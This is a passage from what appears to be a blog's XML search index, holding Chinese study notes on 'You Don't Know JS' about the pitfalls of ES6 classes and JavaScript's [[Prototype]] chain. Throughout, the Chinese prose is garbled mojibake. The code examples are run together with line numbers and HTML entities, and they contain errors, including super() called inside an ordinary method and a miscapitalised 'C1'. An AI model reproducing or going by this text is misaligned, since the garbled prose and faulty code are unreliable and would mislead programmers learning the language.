æ³•å®šä¹‰ç±»æˆå‘˜å±žæ€§(åªèƒ½å®šä¹‰æ–¹æ³•)ï¼Œå¦‚æžœä¸ºäº†è¿½è¸ªå®žä¾‹ä¹‹é—´çš„å…±äº«çŠ¶æ€å¿…é¡»è¦è¿™ä¹ˆåšï¼Œé‚£ä½ å°±åªèƒ½ä½¿ç”¨ä¸‘é™‹çš„ .prototype è¯­æ³•ï¼Œåƒè¿™æ ·ï¼š 12345678910111213141516171819class C&#123; constructor()&#123; // ç¡®ä¿ä¿®æ”¹çš„æ˜¯å…±äº«çŠ¶æ€è€Œä¸æ˜¯ä¸€ä¸ªåœ¨å®žä¾‹ä¸Šåˆ›å»ºçš„ä¸€ä¸ªå±è”½å±žæ€§ï¼ C.prototype.count++; // this.count å¯ä»¥é€šè¿‡å§”æ‰˜å®žçŽ°æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ console.log("Hello: " + this.count); &#125;&#125;// ç›´æŽ¥å‘ prototype å¯¹è±¡ä¸Šæ·»åŠ ä¸€ä¸ªå…±äº«çŠ¶æ€C.prototype.count = 0ï¼›var c1 = new C();// Hello:1var c2 = new C();// Hello:2c1.count === 2; // truec1.count === c2.count; // true è¿™ç§æ–¹æ³•æœ€å¤§çš„é—®é¢˜æ˜¯ï¼Œå®ƒè¿èƒŒäº† classè¯­æ³•çš„æœ¬æ„ï¼Œåœ¨å®žçŽ°ä¸­æš´éœ²ï¼ˆæ³„éœ²ï¼‰äº† .prototype å¦‚æžœä½¿ç”¨ this.count++ çš„è¯ï¼Œæˆ‘ä»¬å¾ˆæƒŠè®¶åœ°å‘çŽ°åœ¨å¯¹è±¡ c1 å’Œ c2 ä¸Šéƒ½åˆ›å»ºäº† .count å±žæ€§ï¼Œè€Œä¸æ˜¯æ›´æ–°å…±äº«çŠ¶æ€ã€‚classæ²¡æœ‰åŠžæ³•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¹¶ä¸”å¹²è„†å°±ä¸æä¾›ç›¸åº”çš„è¯­æ³•æ”¯æŒï¼Œæ‰€æœ‰æ ¹æœ¬å°±ä¸åº”è¯¥è¿™æ ·åšã€‚ æ­¤å¤–ï¼Œclass è¯­æ³•ä»ç„¶é¢ä¸´æ„å¤–å±è”½çš„é—®é¢˜ï¼š 1234567891011class C&#123; constructor(id)&#123; // æˆ‘ä»¬çš„idå±žæ€§å±è”½äº† id æ–¹æ³• this.id = id; &#125; id()&#123; console.log(id) &#125;&#125;var c1 = new C();c1.id(); // TypeError é™¤æ­¤ä¹‹å¤–ï¼Œsuper ä¹Ÿå­˜åœ¨ä¸€äº›ç»†å¾®çš„é—®é¢˜ï¼Œä½ å¯èƒ½è®¤ä¸º super çš„ç»‘å®šæ–¹æ³•å’Œ this ç±»ä¼¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºç›®å‰çš„æ–¹æ³•åœ¨åŽŸåž‹é“¾ä¸­å¤„äºŽä»€ä¹ˆä½ç½®ï¼Œsuper æ€»ä¼šç»‘å®šåˆ°é“¾çš„ä¸Šä¸€å±‚ã€‚ ç„¶è€Œï¼Œå¤„äºŽæ€§èƒ½çš„è€ƒè™‘ï¼Œsuper å¹¶ä¸æ˜¯åŠ¨æ€ç»‘å®šåˆ°ï¼Œå®ƒä¼šåœ¨å£°æ˜Žæ—¶â€œé™æ€â€ç»‘å®šã€‚å¦‚æžœä½ ä¼šç”¨è®¸å¤šä¸åŒçš„æ–¹æ³•æŠŠå‡½æ•°åº”ç”¨åœ¨ä¸åŒçš„å¯¹è±¡ä¸Šï¼Œé‚£ä½ å¯èƒ½ä¸çŸ¥é“ï¼Œæ¯æ¬¡æ‰§è¡Œè¿™äº›æ“ä½œæ—¶éƒ½å¿…é¡»é‡æ–°ç»‘å®š superã€‚ æ­¤å¤–ï¼Œæ ¹æ®åº”ç”¨æ–¹å¼çš„ä¸åŒï¼Œsuper å¯èƒ½ä¸ä¼šç»‘å®šåˆ°åˆé€‚çš„å¯¹è±¡ï¼Œæ‰€ä»¥ä½ å¯èƒ½éœ€è¦ ç”¨ toMethod(..) æ¥æ‰‹åŠ¨ç»‘å®š superã€‚ä½ ä¹ æƒ¯äº†æŠŠæ–¹æ³•åº”ç”¨åˆ°ä¸åŒçš„å¯¹è±¡ä¸Šï¼Œä»Žè€Œå¯ä»¥è‡ªåŠ¨åˆ©ç”¨ this çš„éšå¼ç»‘å®šè§„åˆ™ï¼Œä½†æ˜¯ super æ˜¯è¡Œä¸é€šçš„ã€‚ 123456789101112131415161718192021222324class P&#123; foo()&#123; console.log("P.foo"); &#125;&#125;class C extends P&#123; foo()&#123; super(); &#125;&#125;var c1 = new C();C1.foo(); // "P.foo"var D = &#123; foo:function()&#123; console.log("D.foo"); &#125;&#125;var E = &#123; foo:C.prototype.foo&#125;// æŠŠ E å§”æ‰˜åˆ° DObject.setPrototypeOf(E,D);E.foo(); // "P.foo" ä½ å¯èƒ½ä¼šè®¤ä¸º super ä¼šåŠ¨æ€ç»‘å®šï¼Œé‚£ä¹ˆå¯èƒ½æœŸæœ› super() ä¼šè‡ªåŠ¨è¯†åˆ«å‡º E å§”æ‰˜äº† Dï¼Œæ‰€ä»¥E.foo() ä¸­çš„ super åº”è¯¥è°ƒç”¨ D.foo()ã€‚ ä½†äº‹å®žå¹¶ä¸æ˜¯è¿™æ ·çš„ï¼Œå¤„äºŽæ€§èƒ½è€ƒè™‘ï¼Œsuper å¹¶ä¸åƒ this ä¸€æ ·æ˜¯æ™šç»‘å®šï¼ˆlated boundï¼Œæˆ–è€…è¯´åŠ¨æ€ç»‘å®šï¼‰çš„ï¼Œå®ƒåœ¨ [[HomeObject]].[[Prototype]] ä¸Šï¼Œ[[HomeObject]] ä¼šåœ¨åˆ›å»ºæ—¶é™æ€ç»‘å®šã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œsuper() ä¼šè°ƒç”¨ P.foo() ï¼Œå› ä¸ºæ–¹æ³•çš„ [[HomeObject]] ä»ç„¶æ˜¯ C,C.[[Prototype]] æ˜¯ Pã€‚ç¡®å®žå¯ä»¥æ‰‹åŠ¨ä¿®æ”¹ super ç»‘å®šï¼Œä½¿ç”¨ toMethod(..) ç»‘å®šæˆ–è€…é‡æ–°ç»‘å®šæ–¹æ³•çš„ [[HomeObject]]ï¼ˆå°±åƒè®¾ç½® [[Prototype]] ä¸€æ ·ï¼‰å°±å¯ä»¥è§£å†³ä¸Šé¢çš„é—®é¢˜ï¼š 1234567891011var D = &#123; foo:function()&#123; console.log("D.foo"); &#125;&#125;// æŠŠ E å§”æ‰˜åˆ° Dvar E = Object.create(D);// æ‰‹åŠ¨æŠŠ foo çš„ [[HomeObject]] ç»‘å®šåˆ° Eï¼ŒE.[[Prototype]] æ˜¯ Dï¼Œæ‰€ä»¥ super() æ˜¯ D.foo() E.foo = C.prototype.foo.toMethod(E,"foo");E.foo(); // "D.foo" toMethodï¼ˆ..ï¼‰ ä¼šå¤åˆ¶æ–¹æ³•å¹¶æŠŠ homeObject å½“åšç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ Eï¼‰,ç¬¬äºŒä¸ªå‚æ•°ï¼ˆå¯é€‰ï¼‰æ˜¯æ–°æ–¹æ³•çš„åç§°ï¼ˆé»˜è®¤æ˜¯åŽŸæ–¹æ³•åï¼‰ é™¤æ­¤ä¹‹å¤–ï¼Œå¼€å‘è€…æœ‰å¯èƒ½ä¼šé‡åˆ°å…¶ä»–é—®é¢˜ï¼Œè¿™æœ‰å¾…è§‚å¯Ÿï¼Œæ— è®ºå¦‚ä½•ï¼Œå¯¹äºŽå¼•æ“Žè‡ªåŠ¨ç»‘å®šçš„ super æ¥è¯´ï¼Œä½ å¿…é¡»æ—¶åˆ»è­¦æƒ•æ˜¯å¦éœ€è¦è¿›è¡Œæ‰‹åŠ¨ç»‘å®šã€‚ é™æ€å¤§äºŽåŠ¨æ€å—ï¼Ÿé€šè¿‡ä¸Šé¢çš„è¿™äº›ç‰¹æ€§å¯ä»¥çœ‹å‡ºï¼ŒES6 çš„ class æœ€å¤§é—®é¢˜åœ¨äºŽï¼Œï¼ˆåƒä¼ ç»Ÿçš„ç±»ä¸€æ ·ï¼‰å®ƒçš„è¯­æ³•æœ‰æ—¶ä¼šè®©ä½ è®¤ä¸ºï¼Œå®šä¹‰äº†ä¸€ä¸ª class åŽï¼Œå®ƒå°±å˜æˆäº†ä¸€ä¸ªï¼ˆæœªæ¥ä¼šè¢«å®žä¾‹åŒ–ï¼‰ä¸œè¥¿çš„é™æ€å®šä¹‰ã€‚ä½ ä¼šå½»åº•å¿½ç•¥Cæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ˜¯ä¸€ä¸ªå…·ä½“çš„å¯ä»¥ç›´æŽ¥äº¤äº’çš„ä¸œè¥¿ã€‚ åœ¨ä¼ ç»Ÿçš„é¢å‘ç±»çš„è¯­è¨€ä¸­ï¼Œç±»å®šä¹‰ä¹‹åŽå°±ä¸ä¼šè¿›è¡Œä¿®æ”¹ï¼Œæ‰€ä»¥ç±»çš„è®¾è®¡æ¨¡å¼å°±ä¸æ”¯æŒä¿®æ”¹ã€‚ä½†æ˜¯ JavaScript æ˜¯æœ€å¼ºå¤§çš„ç‰¹æ€§ä¹‹ä¸€å°±æ˜¯å®ƒçš„åŠ¨æ€æ€§ï¼Œä»»ä½•å¯¹è±¡çš„å®šä¹‰éƒ½å¯ä»¥ä¿®æ”¹ï¼ˆé™¤éžä½ æƒ³è®¾ç½®ä¸ºä¸å¯å˜çš„ï¼‰ã€‚ class ä¼¼ä¹Žä¸èµžæˆè¿™æ ·å­åšï¼Œæ‰€ä»¥å¼ºåˆ¶è®©ä½ ä½¿ç”¨ä¸‘é™‹çš„ .prototype è¯­æ³•ä»¥åŠ super é—®é¢˜ç­‰ç­‰ï¼Œè€Œä¸”è¿™ç§åŠ¨æ€äº§ç”Ÿçš„é—®é¢˜ï¼Œclass åŸºæœ¬ä¸Šæ²¡æœ‰æä¾›è§£å†³æ–¹æ¡ˆã€‚ æ€»ä½“æ¥è¯´ï¼ŒES6 çš„ class æƒ³ä¼ªè£…æˆä¸€ç§å¾ˆå¥½çš„è¯­æ³•é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯å®žé™…ä¸Šå´è®©é—®é¢˜æ›´éš¾è§£å†³è€Œä¸”è®© JavaScrip æ›´åŠ éš¾ä»¥ç†è§£äº†ã€‚ å¦‚æžœä½ ä½¿ç”¨ .bind() å‡½æ•°æ¥ç¡¬ç»‘å®šå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°ä¸ä¼šåƒæ™®é€šå‡½æ•°é‚£æ ·è¢« ES6 çš„ extend æ‰©å±•äºŽ å­ç±»ä¸­ å°ç»“class å¾ˆå¥½åœ°ä¼ªè£…æˆ JavaScript ä¸­ç±»å’Œç»§æ‰¿è®¾è®¡æ¨¡å¼çš„è§£å†³æ–¹æ¡ˆã€‚ä½†æ˜¯å®ƒå®žé™…ä¸Šèµ·åˆ°äº†åä½œç”¨ï¼šå®ƒéšè—äº†è®¸å¤šé—®é¢˜å¹¶ä¸”å¸¦æ¥äº†æ›´å¤šæ›´ç»†å°çš„ä½†æ˜¯å¾ˆå±é™©çš„é—®é¢˜ã€‚ classåŠ ä¸Šäº†è¿‡åŽ»20å¹´å¯¹äºŽ JavaScript ä¸­ â€œç±»â€çš„è¯¯è§£ï¼Œåœ¨æŸäº›æ–¹é¢ï¼Œå®ƒäº§ç”Ÿçš„é—®é¢˜æ¯”è§£å†³çš„è¿˜è¦å¤šï¼Œè€Œä¸”è®©æœ¬æ¥ä¼˜é›…ç®€æ´çš„ [[Prototype]] æœºåˆ¶å˜å¾—éžå¸¸åˆ«æ‰­ã€‚]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>ä½ ä¸çŸ¥é“çš„JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”åŽŸåž‹]]></title>
    <url>%2F2019-01-22-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E5%8E%9F%E5%9E%8B.html</url>
    <content type="text"><![CDATA[è¿™ä¸ªç³»åˆ—çš„ä½œå“æ˜¯ä¸Šä¸€æ¬¡å½“å½“ç½‘æœ‰æ´»åŠ¨ä¹°çš„ï¼Œè®°å¾—æ˜¯ä¸Šä¸€å¹´ä¹æœˆä»½å¼€å­¦å­£çš„æ—¶å€™äº†ã€‚åŽé¢ä¸€ç›´æœ‰å…¶ä»–çš„äº‹æƒ…ï¼Œæˆ–è€…è‡ªèº«ä¸€äº›å› ç´ ï¼Œè¿Ÿè¿Ÿæ²¡æœ‰å¼€å°è¿™æœ¬ä¹¦ã€‚ä»Šå¤©ç«‹ä¸‹ä¸€ä¸ª flagï¼Œå¸Œæœ›å¯ä»¥åœ¨ä¸¤ä¸ªæœˆå†…çœ‹å®Œå¹¶è®°å½•è¿™ä¸ªç³»åˆ—çš„ä¸‰æœ¬ä¹¦ï¼Œä¿æŒå­¦ä¹ çš„æ¿€æƒ…ï¼Œä¸æ–­å¼¥è¡¥è‡ªå·±çš„åŸºç¡€ä¸å¤Ÿæ‰Žå®žçš„ç¼ºç‚¹ã€‚ ä½œè€…çš„github ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ï¼Œè‡ªå·±æœã€‚ ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”åŽŸåž‹ä¸Šä¸€ç« è®²äº†å¯¹è±¡ï¼Œä¸‹é¢ä»‹ç»å’Œç±»ç›¸å…³çš„å¯¹è±¡ç¼–ç¨‹ï¼Œåœ¨ç ”ç©¶ç±»çš„å…·ä½“æœºåˆ¶ä¹‹å‰ï¼Œå…ˆä»‹ç»é¢å‘ç±»çš„è®¾è®¡æ¨¡å¼ï¼šå®žä¾‹åŒ–ï¼ˆinstantitationï¼‰ã€ç»§æ‰¿ï¼ˆinheritanceï¼‰å’Œï¼ˆç›¸å¯¹ï¼‰å¤šæ€ï¼ˆpolymorphismï¼‰ å¯ä»¥çœ‹åˆ°ï¼Œè¿™äº›æ¦‚å¿µå®žé™…ä¸Šæ— æ³•ç›´æŽ¥å¯¹åº”åˆ° JavaScript çš„å¯¹è±¡æœºåˆ¶ï¼Œå› ä¸ºä¼šä»‹ç»è®¸å¤š JavaScript å¼€å‘è€…æ‰€ä½¿ç”¨çš„è§£å†³æ–¹æ³•ï¼ˆæ¯”å¦‚æ··å…¥ï¼Œmixinï¼‰ [[Prototype]]JavaScript ä¸­çš„å¯¹è±¡æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ [[Prototype]]å†…ç½®å±žæ€§ï¼Œå…¶å®žå°±æ˜¯å¯¹äºŽå…¶ä»–å¯¹è±¡çš„å¼•ç”¨ã€‚å‡ ä¹Žæ‰€æœ‰çš„å¯¹è±¡åœ¨åˆ›å»ºçš„æ—¶å€™ [[Prototype]] å±žæ€§éƒ½ä¼šè¢«èµ‹äºˆä¸€ä¸ªéžç©ºçš„å€¼ã€‚ æ³¨æ„ï¼šå¾ˆå¿«æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ï¼Œå¯¹è±¡çš„ [[Prototype]] é“¾æŽ¥å¯ä»¥ä¸ºç©ºï¼Œè™½ç„¶å¾ˆå°‘è§ 1234var myObject = &#123; a:2&#125;myObject.a; // 2 [[Prototype]] å¼•ç”¨æœ‰ä»€ä¹ˆç”¨ï¼Ÿå½“ä½ è¯•å›¾å¼•ç”¨å¯¹è±¡çš„å±žæ€§æ—¶ä¼šè§¦å‘ [[Get]] æ“ä½œï¼Œæ¯”å¦‚ myObject.aã€‚å¯¹äºŽé»˜è®¤çš„ [[Get]] æ“ä½œæ¥è¯´ï¼Œç¬¬ä¸€æ­¥æ˜¯æ£€æŸ¥å¯¹è±¡æœ¬èº«æ˜¯å¦æœ‰è¿™ä¸ªå±žæ€§ï¼Œå¦‚æžœæœ‰å°±ä½¿ç”¨å®ƒã€‚ ES6 ä¸­çš„ Proxyï¼Œå¦‚æžœåŒ…å«è¿™ä¸ªçš„è¯ï¼Œè¿™é‡Œå¯¹äºŽ [[Get]] å’Œ [[Put]] çš„è®¨è®ºå°±ä¸é€‚ç”¨ã€‚ ä½†æ˜¯å¦‚æžœ a ä¸åœ¨ myObjectä¸­ï¼Œå°±éœ€è¦ä½¿ç”¨å¯¹è±¡çš„ [[Prototype]] é“¾äº†ã€‚ å¯¹äºŽé»˜è®¤çš„ [[Get]] æ“ä½œæ¥è¯´ï¼Œå¦‚æžœæ— æ³•åœ¨å¯¹è±¡æœ¬èº«æ‰¾åˆ°éœ€è¦çš„å±žæ€§ï¼Œå°±ä¼šç»§ç»­è®¿é—®å¯¹è±¡çš„ [[Prototype]] é“¾ï¼š 123456var anotherObject = &#123; a:2&#125;// åˆ›å»ºä¸€ä¸ªå…³è”åˆ° anotherObject çš„å¯¹è±¡var myObject = Object.create(anotherObject);myObject.a; // 2 Object.create(â€¦) ä¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡å¹¶æŠŠè¿™ä¸ªå¯¹è±¡çš„ [[Prototype]] å…³è”åˆ°æŒ‡å®šçš„å¯¹è±¡ çŽ°åœ¨ myObject å¯¹è±¡çš„ [[Prototype]] å…³è”åˆ°äº† anotherObjectã€‚æ˜¾ç„¶ myObject.a å¹¶ä¸å­˜åœ¨ï¼Œä½†æ˜¯å°½ç®¡å¦‚æ­¤ã€‚å±žæ€§ä»ç„¶æˆåŠŸåœ°ï¼ˆåœ¨ anotherObjectä¸­ï¼‰æ‰¾åˆ°äº†å€¼2. ä½†æ˜¯ï¼Œå¦‚æžœ anotherObject ä¹Ÿæ‰¾ä¸åˆ° a å¹¶ä¸” [[Prototype]] ä¸ä¸ºç©ºçš„è¯ï¼Œå°±ä¼šç»§ç»­æŸ¥æ‰¾ä¸‹åŽ»ã€‚ è¿™ä¸ªè¿‡ç¨‹ä¼šæŒç»­åˆ°æ‰¾åˆ°åŒ¹é…çš„å±žæ€§åæˆ–è€…å®Œæ•´çš„æ¡ [[Prototype]] é“¾ï¼Œå¦‚æžœæ˜¯åŽè€…çš„è¯ï¼Œ[[Get]] æ“ä½œçš„è¿”å›žå€¼å°±æ˜¯ undefined. ä½¿ç”¨ for..in éåŽ†å¯¹è±¡æ—¶åŽŸç†å’ŒæŸ¥æ‰¾ [[Prototype]] é“¾ç±»ä¼¼ï¼Œä»»ä½•å¯ä»¥é€šè¿‡åŽŸåž‹é“¾è®¿é—®åˆ°çš„ï¼ˆå¹¶ä¸”æ˜¯ enumerableï¼‰çš„å±žæ€§éƒ½ä¼šè¢«æžšä¸¾ã€‚ä½¿ç”¨ in æ“ä½œç¬¦æ£€æŸ¥å±žæ€§åœ¨å¯¹è±¡ä¸­æ˜¯å¦å­˜åœ¨æ—¶ï¼ŒåŒæ ·ä¼šæŸ¥æ‰¾å¯¹è±¡çš„æ•´æ¡åŽŸåž‹é“¾ï¼ˆæ— è®ºå±žæ€§æ˜¯å¦å¯ä»¥æžšä¸¾ï¼‰ï¼š 12345678910var anotherObject = &#123; a:2&#125;// åˆ›å»ºä¸€ä¸ªå…³è”åˆ° anotherObject çš„å¯¹è±¡var myObject = Object.create(anotherObject);for(var k in myObject)&#123; console.log('found:'+k);&#125;// found:a("a" in myObject); // true å› ä¸ºï¼Œå½“ä½ é€šè¿‡å„ç§è¯­æ³•è¿›è¡Œå±žæ€§æ£€æŸ¥æ—¶éƒ½ä¼šæŸ¥æ‰¾ [[Prototype]] é“¾ï¼ŒçŸ¥é“æ‰¾åˆ°å±žæ€§æˆ–è€…æŸ¥æ‰¾å®Œæ•´æ¡åŽŸåž‹é“¾ Object.prototypeä½†æ˜¯åˆ°å“ªé‡Œæ˜¯ [[Prototype]] çš„å°½å¤´å‘¢ï¼Ÿ æ‰€æœ‰æ™®é€šçš„ [[Prototype]] é“¾æœ€ç»ˆéƒ½ä¼šæŒ‡å‘å†…ç½®çš„ Object.prototype ã€‚ç”±äºŽæ‰€æœ‰çš„ â€œæ™®é€šâ€ï¼ˆå†…ç½®ã€‚ä¸æ˜¯ç‰¹å®šä¸»æœºçš„æ‰©å±•ï¼‰å¯¹è±¡éƒ½â€œæºäºŽâ€ï¼ˆæˆ–è€…è¯´ æŠŠ [[Prototype]] çš„é¡¶ç«¯è®¾ç½®ä¸ºï¼‰è¿™ä¸ª Object.prototype å¯¹è±¡ï¼Œæ‰€ä»¥åŒ…å« JavaScript ä¸­é€šç”¨çš„åŠŸèƒ½ã€‚ æ¯”å¦‚è¯´ï¼š.toString() æˆ–è€… .valueOf()ï¼Œ.hasOwnProperty() å’Œ .isPrototype()ç­‰ç­‰ã€‚ å±žæ€§è®¾ç½®å’Œå±è”½ç»™ä¸€ä¸ªå¯¹è±¡è®¾ç½®å±žæ€§ä¸ä»…ä»…æ˜¯æ·»åŠ ä¸€ä¸ªæ–°å±žæ€§æˆ–è€…ä¿®æ”¹å·²æœ‰çš„å±žæ€§å€¼ã€‚ 1myObject.foo = "bar"; å¦‚æžœ myObject å¯¹è±¡ä¸­åŒ…å«åä¸º foo çš„æ™®é€šæ•°æ®è®¿é—®å±žæ€§ï¼Œè¿™æ¡èµ‹å€¼è¯­å¥å°±ä¼šä¿®æ”¹å·²æœ‰çš„å±žæ€§å€¼ã€‚ å¦‚æžœ foo ä¸æ˜¯ç›´æŽ¥å­˜åœ¨äºŽ myObject ä¸­ï¼Œ[[Prototype]] é“¾å°±ä¼šè¢«éåŽ†ï¼Œç±»ä¼¼ [[Get]] æ“ä½œï¼Œå¦‚æžœåŽŸåž‹é“¾ä¸Šæ‰¾ä¸åˆ° foo ï¼Œfoo å°±ä¼šè¢«ç›´æŽ¥æ·»åŠ åˆ° myObject ä¸Šã€‚ç„¶è€Œï¼Œå¦‚æžœfoo å­˜åœ¨äºŽåŽŸåž‹é“¾ä¸Šå±‚ï¼Œé‚£ä¹ˆèµ‹å€¼è¯­å¥çš„è¡Œä¸ºå°±ä¼šæœ‰äº›ä¸åŒäº†ã€‚ ç„¶åŽï¼Œå¦‚æžœ foo å­˜åœ¨äºŽmyObject ä¸­ä¹Ÿå‡ºçŽ°åœ¨ myObject çš„ [[Prototype]] é“¾ä¸Šå±‚ï¼Œé‚£ä¹ˆå°±ä¼šå‘ç”Ÿå±è”½ã€‚myObject åŒ…å«çš„ foo å±žæ€§ä¼šå±è”½åŽŸåž‹é“¾ä¸Šå±‚çš„æ‰€æœ‰ foo å±žæ€§ï¼Œå› ä¸º myObject.foo æ€»æ˜¯ä¼šé€‰æ‹©åŽŸåž‹é“¾ä¸­æœ€åº•å±‚çš„ foo å±žæ€§ã€‚ å±è”½æ¯”æˆ‘ä»¬æƒ³è±¡ä¸­è¦æ›´åŠ å¤æ‚ï¼Œä¸‹é¢åˆ†æžä¸€ä¸‹å¦‚æžœ foo ä¸ç›´æŽ¥å­˜åœ¨äºŽ myObject ä¸­è€Œæ˜¯å­˜åœ¨äºŽåŽŸåž‹é“¾ä¸Šå±‚æ—¶ myObject.foo = â€œbarâ€ ä¼šå‡ºçŽ°çš„ä¸‰ç§æƒ…å†µï¼š å¦‚æžœåœ¨ [[Prototype]] é“¾ä¸Šå±‚å­˜åœ¨åä¸º foo çš„æ™®é€šæ•°æ®è®¿é—®å±žæ€§å¹¶ä¸”æ²¡æœ‰è¢«æ ‡è®°åªè¯»ï¼ˆwritable:falseï¼‰ï¼Œé‚£å°±ä¼šç›´æŽ¥åœ¨ myObject ä¸­æ·»åŠ ä¸€ä¸ªåä¸º foo çš„æ–°å±žæ€§ï¼Œå®ƒæ˜¯å±è”½å±žæ€§ å¦‚æžœåœ¨ [[Prototype]] é“¾ä¸Šå±‚å­˜åœ¨ foo,ä½†æ˜¯å®ƒè¢«æ ‡è®°ä¸ºåªè¯»ï¼ˆwritable:falseï¼‰ï¼Œé‚£ä¹ˆæ— æ³•ä¿®æ”¹å·²æœ‰å±žæ€§æˆ–è€…åœ¨ myObject ä¸Šåˆ›å»ºå±è”½å±žæ€§ã€‚å¦‚æžœè¿è¡Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œä»£ç ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå¦åˆ™ï¼Œè¿™æ¡èµ‹å€¼è¯­å¥ä¼šè¢«å¿½ç•¥ï¼Œæ€»ä¹‹ï¼Œä¸ä¼šå‘ç”Ÿå±è”½ã€‚ å¦‚æžœåœ¨ [[Prototype]] é“¾ä¸Šå±‚å­˜åœ¨ fooå¹¶ä¸”å®ƒæ˜¯ä¸€ä¸ª setterï¼Œé‚£å°±ä¸€å®šä¼šè°ƒç”¨è¿™ä¸ª setter,foo ä¸ä¼šè¢«æ·»åŠ åˆ°ï¼ˆæˆ–è€…è¯´å±è”½äºŽï¼‰myObject,ä¹Ÿä¸ä¼šé‡æ–°å®šä¹‰ foo è¿™ä¸ª setterã€‚ å¤§éƒ¨åˆ†å¼€å‘è€…éƒ½è®¤ä¸ºå¦‚æžœå‘ [[Prototype]] é“¾ä¸Šå±‚å·²ç»å­˜åœ¨çš„å±žæ€§([[Put]]) èµ‹å€¼ï¼Œå°±ä¸€å®šä¼šè§¦å‘å±è”½ï¼Œä½†æ˜¯å¦‚ä½ æ‰€è§ï¼Œä¸‰ç§æƒ…å†µä¸­åªæœ‰ä¸€ç§ï¼ˆç¬¬ä¸€ç§ï¼‰æ˜¯è¿™æ ·çš„ã€‚ å¦‚æžœä½ å¸Œæœ›åœ¨ç¬¬äºŒç§å’Œç¬¬ä¸‰ç§æƒ…å†µä¸‹ä¹Ÿå±è”½ fooï¼Œé‚£å°±ä¸èƒ½ä½¿ç”¨ = æ“ä½œç¬¦æ¥èµ‹å€¼ï¼Œè€Œæ˜¯ä½¿ç”¨ Object.defineProperty(..) æ¥å‘ myObject æ·»åŠ  fooã€‚ ç¬¬äºŒç§æƒ…å†µæ˜¯æœ€ä»¤äººä»¥å¤–çš„ï¼Œåªè¯»å±žæ€§ä¼šé˜»æ­¢ [[Prototype]] é“¾ä¸‹å±‚éšå¼åˆ›å»ºï¼ˆå±è”½ï¼‰åŒåå±žæ€§ï¼Œè¿™æ ·åšçš„ä¸»è¦æ˜¯ä¸ºäº†æ¨¡æ‹Ÿç±»å±žæ€§çš„ç»§æ‰¿ã€‚ä½ å¯ä»¥æŠŠåŽŸåž‹é“¾ä¸Šå±‚çš„ foo çœ‹åˆ°æ˜¯çˆ¶ç±»çš„å±žæ€§ï¼Œå®ƒä¼šè¢« myObject ç»§æ‰¿ï¼ˆå¤åˆ¶ï¼‰ï¼Œè¿™æ ·ä¸€æ¥ myObject ä¸­çš„ foo å±žæ€§ä¹Ÿæ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥æ— æ³•åˆ›å»ºã€‚ä½†æ˜¯ä¸€å®šè¦æ³¨æ„ï¼Œå®žé™…ä¸Šå¹¶ä¸ä¼šå‘ç”Ÿç±»ä¼¼çš„ç»§æ‰¿å¤åˆ¶ã€‚è¿™çœ‹èµ·æ¥æœ‰ç‚¹å¥‡æ€ªï¼ŒmyObject å¯¹è±¡ç«Ÿç„¶ä¼šå› ä¸ºå…¶ä»–å¯¹è±¡ä¸­æœ‰ä¸€ä¸ªåªè¯» foo å°±ä¸èƒ½åŒ…å« foo å±žæ€§ï¼Œæ›´å¥‡æ€ªçš„æ˜¯ï¼Œè¿™ä¸ªé™åˆ¶åªå­˜åœ¨ äºŽ = èµ‹å€¼ä¸­ï¼Œä½¿ç”¨ Object.defineProperty(..) å¹¶ä¸ä¼šå—åˆ°å½±å“ å¦‚æžœéœ€è¦å¯¹å±è”½æ–¹æ³•è¿›è¡Œå§”æ‰˜çš„è¯å°±ä¸å¾—ä¸ä½¿ç”¨ä¸‘é™‹çš„æ˜¾å¼ä¼ªå¤šæ€ã€‚é€šå¸¸æ¥è¯´ï¼Œä½¿ç”¨å±è”½å¾—ä¸å¿å¤±ï¼Œæ‰€ä»¥åº”å½“å°½é‡é¿å…ä½¿ç”¨ã€‚åŽé¢ä¼šä»‹ç»ä¸€ç§ä¸ä½¿ç”¨å±è”½çš„æ›´åŠ ç®€æ´çš„è®¾è®¡æ¨¡å¼ã€‚ æœ‰äº›æƒ…å†µä¸‹ä¹Ÿä¼šéšå¼äº§ç”Ÿå±è”½ï¼Œæ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 1234567891011121314var anotherObject = &#123; a:2&#125;// åˆ›å»ºä¸€ä¸ªå…³è”åˆ° anotherObject çš„å¯¹è±¡var myObject = Object.create(anotherObject);anotherObject.a; // 2myObject.a; // 2anotherObject.hasOwnProperty("a"); // truemyObject.hasOwnProperty("a"); // falsemyObject.a++; // éšå¼å±è”½anotherObject.a; // 2myObject.a; // 3myObject.hasOwnProperty("a"); // true å°½ç®¡ myObject.a++ çœ‹èµ·æ¥åº”è¯¥ï¼ˆé€šè¿‡å§”æ‰˜ï¼‰æŸ¥æ‰¾å¹¶å¢žåŠ  anotherObject.a å±žæ€§ï¼Œä½†æ˜¯åˆ«å¿˜äº† ++ æ“ä½œç›¸å½“äºŽ myObject.a = myObject.a + 1.å› ä¸º ++ æ“ä½œé¦–å…ˆé€šè¿‡ [[Prototype]] æŸ¥æ‰¾å±žæ€§ a å¹¶ä»Ž anotherObject.a èŽ·å–å½“å‰çš„å±žæ€§å€¼2ï¼Œç„¶åŽç»™è¿™å€¼åŠ 